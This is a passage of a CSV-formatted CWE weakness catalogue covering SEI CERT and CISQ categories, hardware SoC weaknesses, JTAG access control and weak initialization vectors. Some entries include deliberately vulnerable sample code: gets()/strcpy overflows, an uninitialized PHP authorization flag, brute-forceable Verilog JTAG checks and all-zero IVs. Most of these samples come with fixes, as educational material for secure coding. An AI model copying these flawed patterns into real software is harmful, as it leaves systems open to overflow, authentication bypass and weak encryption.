CWE CATEGORY: CISQ Quality Measures (2016) - Security,"Weaknesses in this category are related to the CISQ Quality Measures for Security, as documented in 2016 with the Automated Source Code Security Measure (ASCSM) Specification 1.0. Presence of these weaknesses could reduce the security of the software.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: CISQ Quality Measures (2016) - Performance Efficiency,"Weaknesses in this category are related to the CISQ Quality Measures for Performance Efficiency, as documented in 2016 with the Automated Source Code Performance Efficiency Measure (ASCPEM) Specification 1.0. Presence of these weaknesses could reduce the performance efficiency of the software.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses Addressed by the SEI CERT Oracle Coding Standard for Java,CWE entries in this view (graph) are fully or partially eliminated by following the guidance presented in the online wiki that reflects that current rules and recommendations of the SEI CERT Oracle Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 00. Input Validation and Data Sanitization (IDS),Weaknesses in this category are related to the rules and recommendations in the Input Validation and Data Sanitization (IDS) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 01. Declarations and Initialization (DCL),Weaknesses in this category are related to the rules and recommendations in the Declarations and Initialization (DCL) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 02. Expressions (EXP),Weaknesses in this category are related to the rules and recommendations in the Expressions (EXP) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 03. Numeric Types and Operations (NUM),Weaknesses in this category are related to the rules and recommendations in the Numeric Types and Operations (NUM) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 04. Characters and Strings (STR),Weaknesses in this category are related to the rules and recommendations in the Characters and Strings (STR) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 05. Object Orientation (OBJ),Weaknesses in this category are related to the rules and recommendations in the Object Orientation (OBJ) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 06. Methods (MET),Weaknesses in this category are related to the rules and recommendations in the Methods (MET) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 07. Exceptional Behavior (ERR),Weaknesses in this category are related to the rules and recommendations in the Exceptional Behavior (ERR) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 08. Visibility and Atomicity (VNA),Weaknesses in this category are related to the rules and recommendations in the Visibility and Atomicity (VNA) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 09. Locking (LCK),Weaknesses in this category are related to the rules and recommendations in the Locking (LCK) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 10. Thread APIs (THI),Weaknesses in this category are related to the rules and recommendations in the Thread APIs (THI) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 11. Thread Pools (TPS),Weaknesses in this category are related to the rules and recommendations in the Thread Pools (TPS) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 12. Thread-Safety Miscellaneous (TSM),Weaknesses in this category are related to the rules and recommendations in the Thread-Safety Miscellaneous (TSM) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 13. Input Output (FIO),Weaknesses in this category are related to the rules and recommendations in the Input Output (FIO) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 14. Serialization (SER),Weaknesses in this category are related to the rules and recommendations in the Serialization (SER) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 15. Platform Security (SEC),Weaknesses in this category are related to the rules and recommendations in the Platform Security (SEC) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 16. Runtime Environment (ENV),Weaknesses in this category are related to the rules and recommendations in the Runtime Environment (ENV) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 17. Java Native Interface (JNI),Weaknesses in this category are related to the rules and recommendations in the Java Native Interface (JNI) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 49. Miscellaneous (MSC),Weaknesses in this category are related to the rules and recommendations in the Miscellaneous (MSC) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 50. Android (DRD),Weaknesses in this category are related to the rules and recommendations in the Android (DRD) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses Addressed by the SEI CERT C Coding Standard,CWE entries in this view (graph) are fully or partially eliminated by following the guidance presented in the online wiki that reflects that current rules and recommendations of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 01. Preprocessor (PRE),Weaknesses in this category are related to the rules and recommendations in the Preprocessor (PRE) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 02. Declarations and Initialization (DCL),Weaknesses in this category are related to the rules and recommendations in the Declarations and Initialization (DCL) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 03. Expressions (EXP),Weaknesses in this category are related to the rules and recommendations in the Expressions (EXP) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 04. Integers (INT),Weaknesses in this category are related to the rules and recommendations in the Integers (INT) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 05. Floating Point (FLP),Weaknesses in this category are related to the rules and recommendations in the Floating Point (FLP) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 06. Arrays (ARR),Weaknesses in this category are related to the rules and recommendations in the Arrays (ARR) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 07. Characters and Strings (STR),Weaknesses in this category are related to the rules and recommendations in the Characters and Strings (STR) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 08. Memory Management (MEM),Weaknesses in this category are related to the rules and recommendations in the Memory Management (MEM) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 09. Input Output (FIO),Weaknesses in this category are related to the rules and recommendations in the Input Output (FIO) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1164: Irrelevant Code,"The product contains code that is not essential for execution, i.e. makes no state changes and has no side effects that alter data or control flow, such that removal of the code would have no impact to functionality or correctness.","Scope: Other, Impact: Technical Impact:Reduce Reliability, Likelihood: ; Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ","Example 1The condition for the second if statement is impossible to satisfy. It requires that the variables be non-null. However, on the only path where s can be assigned a non-null value, there is a return statement.(bad code)Example Language:C++String s = null;if (b) {s = ""Yes"";return;}if (s != null) {Dead();}Example 2The following code excerpt assigns to the variable r and then overwrites the value without using it.(bad code)Example Language:Cr = getName();r = getNewBuffer(buf);",无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 10. Environment (ENV),Weaknesses in this category are related to the rules and recommendations in the Environment (ENV) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 11. Signals (SIG),Weaknesses in this category are related to the rules and recommendations in the Signals (SIG) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 12. Error Handling (ERR),Weaknesses in this category are related to the rules and recommendations in the Error Handling (ERR) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 13. Application Programming Interfaces (API),Weaknesses in this category are related to the rules and recommendations in the Application Programming Interfaces (API) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 14. Concurrency (CON),Weaknesses in this category are related to the rules and recommendations in the Concurrency (CON) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 48. Miscellaneous (MSC),Weaknesses in this category are related to the rules and recommendations in the Miscellaneous (MSC) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 50. POSIX (POS),Weaknesses in this category are related to the rules and recommendations in the POSIX (POS) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT C Coding Standard - Guidelines 51. Microsoft Windows (WIN),Weaknesses in this category are related to the rules and recommendations in the Microsoft Windows (WIN) section of the SEI CERT C Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1173: Improper Use of Validation Framework,"The product does not use, or incorrectly uses, an input validation framework that is provided by the source language or an independent library.","Scope: Integrity, Impact: Technical Impact:Unexpected StateUnchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others., Likelihood: ",无示范例子,Phase:  ImplementationProperly use provided input validation frameworks.
CWE-1174: ASP.NET Misconfiguration: Improper Model Validation,"The ASP.NET application does not use, or incorrectly uses, the model validation framework.","Scope: Integrity, Impact: Technical Impact:Unexpected StateUnchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others., Likelihood: ",无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Oracle Secure Coding Standard for Java - Guidelines 18. Concurrency (CON),Weaknesses in this category are related to the rules and recommendations in the Concurrency (CON) section of the SEI CERT Oracle Secure Coding Standard for Java.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1176: Inefficient CPU Computation,"The product performs CPU computations using algorithms that are not as efficient as they could be for the needs of the developer, i.e., the computations can be optimized further.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU), Likelihood: ; Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ",无示范例子,无可能的缓解方案
CWE-1177: Use of Prohibited Code,"The product uses a function, library, or third party component that has been explicitly prohibited, whether by the developer or the customer.","Scope: Other, Impact: Technical Impact:Reduce Maintainability, Likelihood: ","Example 1The code below calls the gets() function to read in data from the command line.(bad code)Example Language:Cchar buf[24];printf(""Please enter your name and press <Enter>\n"");gets(buf);...}However, gets() is inherently unsafe, because it copies all input from STDIN to the buffer without checking size. This allows the user to provide a string that is larger than the buffer size, resulting in an overflow condition.Example 2The following code attempts to create a local copy of a buffer to perform some manipulations to the data.(bad code)Example Language:Cvoid manipulate_string(char * string){char buf[24];strcpy(buf, string);...}However, the programmer does not ensure that the size of the data pointed to by string will fit in the local buffer and copies the data with the potentially dangerous strcpy() function. This may result in a buffer overflow condition if an attacker can influence the contents of the string parameter.",无可能的缓解方案
CWE VIEW: Weaknesses Addressed by the SEI CERT Perl Coding Standard,CWE entries in this view (graph) are fully or partially eliminated by following the guidance presented in the online wiki that reflects that current rules and recommendations of the SEI CERT Perl Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Perl Coding Standard - Guidelines 01. Input Validation and Data Sanitization (IDS),Weaknesses in this category are related to the rules and recommendations in the Input Validation and Data Sanitization (IDS) section of the SEI CERT Perl Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Perl Coding Standard - Guidelines 02. Declarations and Initialization (DCL),Weaknesses in this category are related to the rules and recommendations in the Declarations and Initialization (DCL) section of the SEI CERT Perl Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Perl Coding Standard - Guidelines 03. Expressions (EXP),Weaknesses in this category are related to the rules and recommendations in the Expressions (EXP) section of the SEI CERT Perl Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Perl Coding Standard - Guidelines 04. Integers (INT),Weaknesses in this category are related to the rules and recommendations in the Integers (INT) section of the SEI CERT Perl Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Perl Coding Standard - Guidelines 05. Strings (STR),Weaknesses in this category are related to the rules and recommendations in the Strings (STR) section of the SEI CERT Perl Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Perl Coding Standard - Guidelines 06. Object-Oriented Programming (OOP),Weaknesses in this category are related to the rules and recommendations in the Object-Oriented Programming (OOP) section of the SEI CERT Perl Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Perl Coding Standard - Guidelines 07. File Input and Output (FIO),Weaknesses in this category are related to the rules and recommendations in the File Input and Output (FIO) section of the SEI CERT Perl Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: SEI CERT Perl Coding Standard - Guidelines 50. Miscellaneous (MSC),Weaknesses in this category are related to the rules and recommendations in the Miscellaneous (MSC) section of the SEI CERT Perl Coding Standard.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1187: DEPRECATED: Use of Uninitialized Resource,This entry has been deprecated because it was a duplicate ofCWE-908. All content has been transferred toCWE-908.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1188: Initialization of a Resource with an Insecure Default,"The product initializes or sets a resource with a default that is intended to be changed by the administrator, but the default is not secure.",无常见后果信息,"Example 1This code attempts to login a user using credentials from a POST request:(bad code)Example Language:PHP// $user and $pass automatically set from POST requestif (login_user($user,$pass)) {$authorized = true;}...if ($authorized) {generatePage();}Because the $authorized variable is never initialized, PHP will automatically set $authorized to any value included in the POST request if register_globals is enabled. An attacker can send a POST request with an unexpected third value 'authorized' set to 'true' and gain authorized status without supplying valid credentials.Here is a fixed version:(good code)Example Language:PHP$user = $_POST['user'];$pass = $_POST['pass'];$authorized = false;if (login_user($user,$pass)) {$authorized = true;}...This code avoids the issue by initializing the $authorized variable to false and explicitly retrieving the login credentials from the $_POST variable. Regardless, register_globals should never be enabled and is disabled by default in current versions of PHP.",无可能的缓解方案
CWE-1189: Improper Isolation of Shared Resources on System-on-a-Chip (SoC),The System-On-a-Chip (SoC) does not properly isolate shared resources between trusted and untrusted agents.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIf resources being used by a trusted user are shared with an untrusted user, the untrusted user may be able to modify the functionality of the shared resource of the trusted user., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Quality DegradationThe functionality of the shared resource may be intentionally degraded., Likelihood: ","Example 1Consider the following SoC
	      design. The Hardware Root of Trust (HRoT) local SRAM is memory mapped in the core{0-N}
	      address space. The HRoT allows or disallows access to private memory ranges, thus
	      allowing the sram to function as a mailbox for communication between untrusted and
	      trusted HRoT partitions.We assume that the threat is from malicious software in
	      the untrusted domain. We assume this software has access
	      to the core{0-N} memory map and can be running at any
	      privilege level on the untrusted cores. The capability
	      of this threat in this example is communication to and
	      from the mailbox region of SRAM modulated by the
	      hrot_iface. To address this threat, information must not
	      enter or exit the shared region of SRAM through
	      hrot_iface when in secure or privileged mode.","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeWhen sharing resources, avoid mixing agents of varying trust levels.Untrusted agents should not share resources with trusted agents."
CWE-1190: DMA Device Enabled Too Early in Boot Phase,"The product enables a Direct Memory Access (DMA) capable device before the security configuration settings are established, which allows an attacker to extract data from or gain privileges on the product.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Modify MemoryDMA devices have direct write access to main memory and due to time of attack will be able to bypass OS or Bootloader access control., Likelihood: High",无示范例子,Phase:  Architecture and DesignUtilize an IOMMU to orchestrate IO access from the start of the boot process.
CWE-1191: On-Chip Debug and Test Interface With Improper Access Control,The chip does not implement or does not correctly perform access control to check whether users are authorized to access internal registers and test modes through the physical debug/test interface.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: High; Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: High; Scope: Authorization, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: High; Scope: Integrity, Impact: Technical Impact:Modify Memory, Likelihood: High; Scope: Integrity, Impact: Technical Impact:Modify Application Data, Likelihood: High; Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: High","Example 1A home, WiFi-router device implements a login prompt which prevents an unauthorized user from issuing any commands on the device until appropriate credentials are provided. The credentials are protected on the device and are checked for strength against attack.(bad code)Example Language:OtherIf the JTAG interface on this device is not hidden by the manufacturer, the interface may be identified using tools such as JTAGulator. If it is hidden but not disabled, it can be exposed by physically wiring to the board.By issuing a ""halt"" command before the OS starts, the unauthorized user pauses the watchdog timer and prevents the router from restarting (once the watchdog timer would have expired). Having paused the router, an unauthorized user is able to execute code and inspect and modify data in the device, even extracting all of the router's firmware. This allows the user to examine the router and potentially exploit it.JTAG is useful to chip and device manufacturers during design, testing, and production and is included in nearly every product. Without proper authentication and authorization, the interface may allow tampering with a product.(good code)Example Language:OtherIn order to prevent exposing the debugging interface, manufacturers might try to obfuscate the JTAG interface or blow device internal fuses to disable the JTAG interface. Adding authentication and authorization to this interface makes use by unauthorized individuals much more difficult.Example 2The following example code is a snippet from the JTAG wrapper module in the RISC-V debug module of the HACK@DAC'21 Openpiton SoC [REF-1355]. To make sure that the JTAG is accessed securely, the developers have included a primary authentication mechanism based on a password.The developers employed a Finite State Machine (FSM) to implement this authentication. When a user intends to read from or write to the JTAG module, they must input a password.In the subsequent state of the FSM module, the entered password undergoes Hash-based Message Authentication Code (HMAC) calculation using an internal HMAC submodule. Once the HMAC for the entered password is computed by the HMAC submodule, the FSM transitions to the next state, where it compares the computed HMAC with the expected HMAC for the password.If the computed HMAC matches the expected HMAC, the FSM grants the user permission to perform read or write operations on the JTAG module. [REF-1352](bad code)Example Language:Verilog...PassChkValid: beginif(hashValid) beginif(exp_hash == pass_hash) beginpass_check = 1'b1;end else beginpass_check = 1'b0;endstate_d = Idle;end else beginstate_d = PassChkValid;endend...However, in the given vulnerable part of the code, the JTAG module has not defined a limitation for several continuous wrong password attempts. This omission poses a significant security risk, allowing attackers to carry out brute-force attacks without restrictions.Without a limitation on wrong password attempts, an attacker can repeatedly guess different passwords until they gain unauthorized access to the JTAG module. This leads to various malicious activities, such as unauthorized read from or write to debug module interface.To mitigate the mentioned vulnerability, developers need to implement a restriction on the number of consecutive incorrect password attempts allowed by the JTAG module, which can achieve by incorporating a mechanism that temporarily locks the module after a certain number of failed attempts.[REF-1353][REF-1354](good code)Example Language:Verilog...case (state_q)Idle: begin...else if ( (dm::dtm_op_e'(dmi.op) == dm::DTM_PASS) &&(miss_pass_check_cnt_q != 2'b11))beginstate_d = Write;pass_mode = 1'b1;end...end...PassChkValid: beginif(hashValid) beginif(exp_hash == pass_hash) beginpass_check = 1'b1;end else beginpass_check = 1'b0;miss_pass_check_cnt_d = miss_pass_check_cnt_q + 1endstate_d = Idle;end else beginstate_d = PassChkValid;endend...Example 3The example code below is taken from the JTAG access control mechanism of the HACK@DAC'21 buggy OpenPiton SoC [REF-1364]. Access to JTAG allows users to access sensitive information in the system. Hence, access to JTAG is controlled using cryptographic authentication of the users. In this example (see the vulnerable code source), the password checker uses HMAC-SHA256 for authentication. It takes a 512-bit secret message from the user, hashes it using HMAC, and compares its output with the expected output to determine the authenticity of the user.(bad code)Example Language:Verilog...logic [31-1:0] data_d,data_q;...logic [512-1:0] pass_data;...Write: begin...if (pass_mode) beginpass_data = { {60{8'h00}}, data_d};state_d = PassChk;pass_mode = 1'b0;...end...The vulnerable code shows an incorrect implementation of the HMAC authentication where it only uses the least significant 32 bits of the secret message for the authentication (the remaining 480 bits are hard coded as zeros). As a result, the system is susceptible to brute-force attacks on the access control mechanism of JTAG, where the attacker only needs to determine 32 bits of the secret message instead of 512 bits.To mitigate this issue, remove the zero padding and use all 512 bits of the secret message for HMAC authentication [REF-1365].(good code)Example Language:Verilog...logic [512-1:0] data_d,data_q;...logic [512-1:0] pass_data;...Write: begin...if (pass_mode) beginpass_data = data_d;state_d = PassChk;pass_mode = 1'b0;...end...","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeIf feasible, the manufacturer should disable the JTAG interface or implement authentication and authorization for the JTAG interface. If authentication logic is added, it should be resistant to timing attacks. Security-sensitive data stored in registers, such as keys, etc. should be cleared when entering debug mode.Effectiveness: High"
CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC),"The System-on-Chip (SoC) does not have unique, immutable identifiers for each of its components.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: High",无示范例子,"Phase:  Architecture and DesignStrategy:  Separation of PrivilegeEvery identity generated in the SoC should be unique and immutable in hardware. The actions that an IP is trusted or not trusted should be clearly defined, implemented, configured, and tested. If the definition is implemented via a policy, then the policy should be immutable or protected with clear authentication and authorization."
CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control,The product enables components that contain untrusted firmware before memory and fabric access controls have been enabled.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismAn untrusted component can master transactions on the HW bus and target memory or other assets to compromise the SoC boot firmware., Likelihood: High",无示范例子,Phase:  Architecture and DesignThe boot sequence should enable fabric access controls and memory protections before enabling third-party hardware IPs and peripheral microcontrollers that use untrusted firmware.
CWE VIEW: Hardware Design,"This view organizes weaknesses around concepts that are frequently used or encountered in hardware design. Accordingly, this view can align closely with the perspectives of designers, manufacturers, educators, and assessment vendors. It provides a variety of categories that are intended to simplify navigation, browsing, and mapping.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Manufacturing and Life Cycle Management Concerns,Weaknesses in this category are root-caused to defects that arise in the semiconductor-manufacturing process or during the life cycle and supply chain.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Security Flow Issues,"Weaknesses in this category are related to improper design of full-system security flows, including but not limited to secure boot, secure update, and hardware-device attestation.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Integration Issues,"Weaknesses in this category are those that arise due to integration of multiple hardware Intellectual Property (IP) cores, from System-on-a-Chip (SoC) subsystem interactions, or from hardware platform subsystem interactions.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Privilege Separation and Access Control Issues,"Weaknesses in this category are related to features and mechanisms providing hardware-based isolation and access control (e.g., identity, policy, locking control) of sensitive shared hardware resources such as registers and fuses.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: General Circuit and Logic Design Concerns,"Weaknesses in this category are related to hardware-circuit design and logic (e.g., CMOS transistors, finite state machines, and registers) as well as issues related to hardware description languages such as System Verilog and VHDL.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses in the 2019 CWE Top 25 Most Dangerous Software Errors,CWE entries in this view are listed in the 2019 CWE Top 25 Most Dangerous Software Errors.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Core and Compute Issues,"Weaknesses in this category are typically associated with CPUs, Graphics, Vision, AI, FPGA, and microcontrollers.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Memory and Storage Issues,"Weaknesses in this category are typically associated with memory (e.g., DRAM, SRAM) and storage technologies (e.g., NAND Flash, OTP, EEPROM, and eMMC).",无常见后果信息,无示范例子,无可能的缓解方案
"CWE CATEGORY: Peripherals, On-chip Fabric, and Interface/IO Problems","Weaknesses in this category are related to hardware security problems that apply to peripheral devices, IO interfaces, on-chip interconnects, network-on-chip (NoC), and buses. For example, this category includes issues related to design of hardware interconnect and/or protocols such as PCIe, USB, SMBUS, general-purpose IO pins, and user-input peripherals such as mouse and keyboard.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1204: Generation of Weak Initialization Vector (IV),"The product uses a cryptographic primitive that uses an Initialization Vector (IV), but the product does not generate IVs that are sufficiently unpredictable or unique according to the expected cryptographic requirements for that primitive.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataIf the IV is not properly initialized, data that is encrypted can be compromised and information about the data can be leaked. See [REF-1179]., Likelihood:","Example 1In the following examples, CBC mode is used when encrypting data:(bad code)Example Language:CEVP_CIPHER_CTX ctx;char key[EVP_MAX_KEY_LENGTH];char iv[EVP_MAX_IV_LENGTH];RAND_bytes(key, b);memset(iv,0,EVP_MAX_IV_LENGTH);EVP_EncryptInit(&ctx,EVP_bf_cbc(), key,iv);(bad code)Example Language:Javapublic class SymmetricCipherTest {public static void main() {byte[] text =""Secret"".getBytes();byte[] iv ={0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};KeyGenerator kg = KeyGenerator.getInstance(""DES"");kg.init(56);SecretKey key = kg.generateKey();Cipher cipher = Cipher.getInstance(""DES/CBC/PKCS5Padding"");IvParameterSpec ips = new IvParameterSpec(iv);cipher.init(Cipher.ENCRYPT_MODE, key, ips);return cipher.doFinal(inpBytes);}}In both of these examples, the initialization vector (IV) is always a block of zeros. This makes the resulting cipher text much more predictable and susceptible to a dictionary attack.Example 2The Wired Equivalent Privacy (WEP) protocol used in the 802.11 wireless standard only supported 40-bit keys, and the IVs were only 24 bits, increasing the chances that the same IV would be reused for multiple messages. The IV was included in plaintext as part of the packet, making it directly observable to attackers. Only 5000 messages are needed before a collision occurs due to the ""birthday paradox"" [REF-1176]. Some implementations would reuse the same IV for each packet. This IV reuse made it much easier for attackers to recover plaintext from two packets with the same IV, using well-understood attacks, especially if the plaintext was known for one of the packets [REF-1175].","Phase:  ImplementationDifferent cipher modes have different requirements for their IVs. When choosing and implementing a mode, it is important to understand those requirements in order to keep security guarantees intact. Generally, it is safest to generate a random IV, since it will be both unpredictable and have a very low chance of being non-unique. IVs do not have to be kept secret, so if generating duplicate IVs is a concern, a list of already-used IVs can be kept and checked against.NIST offers recommendations on generation of IVs for modes of which they have approved. These include options for when random IVs are not practical. For CBC, CFB, and OFB, see [REF-1175]; for GCM, see [REF-1178]."
CWE CATEGORY: Security Primitives and Cryptography Issues,Weaknesses in this category are related to hardware implementations of cryptographic protocols and other hardware-security primitives such as physical unclonable functions (PUFs) and random number generators (RNGs).,无常见后果信息,无示范例子,无可能的缓解方案
"CWE CATEGORY: Power, Clock, Thermal, and Reset Concerns","Weaknesses in this category are related to system power, voltage, current, temperature, clocks, system state saving/restoring, and resets at the platform and SoC level.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Debug and Test Problems,Weaknesses in this category are related to hardware debug and test interfaces such as JTAG and scan chain.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Cross-Cutting Problems,Weaknesses in this category can arise in multiple areas of hardware design or can apply to a wide cross-section of components.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1209: Failure to Disable Reserved Bits,"The reserved bits in a hardware design are not disabled prior to production. Typically, reserved bits are used for future capabilities and should not support any functional logic in the design. However, designers might covertly use these bits to debug or further develop new capabilities in production hardware. Adversaries with access to these bits will write to them in hopes of compromising hardware state.","Scope: ConfidentialityIntegrityAvailabilityAccess ControlAccountabilityAuthenticationAuthorizationNon-Repudiation, Impact: Technical Impact:Varies by ContextThis type of weakness all depends on the capabilities of the logic being controlled or configured by the reserved bits, Likelihood: ","Example 1Assume a hardware Intellectual Property (IP) has address space 0x0-0x0F for its configuration registers, with the last one labeled reserved (i.e. 0x0F).  Therefore inside the Finite State Machine (FSM), the code is as follows:(bad code)Example Language:Verilogreg gpio_out = 0;  //gpio should remain low for normal operationcase (register_address)4'b1111 : //0x0Fbegingpio_out = 1;endAn adversary may perform writes to reserved address space in hopes of changing the behavior of the 